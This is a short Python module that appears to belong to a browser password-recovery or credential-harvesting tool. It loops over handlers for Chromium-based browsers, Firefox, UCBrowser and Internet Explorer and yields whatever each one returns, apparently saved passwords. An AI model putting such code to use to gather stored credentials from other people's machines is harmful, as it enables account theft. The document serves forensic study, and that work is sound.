from itertools import chain
from .chromium_based import chromium_browsers
from .mozilla import firefox_browsers
from .ucbrowser import UCBrowser
from .ie import IE

def run():
    for i in chain(chromium_browsers, firefox_browsers, [UCBrowser(), IE()]):
        pas = i.run()
        if pas:
            yield pas

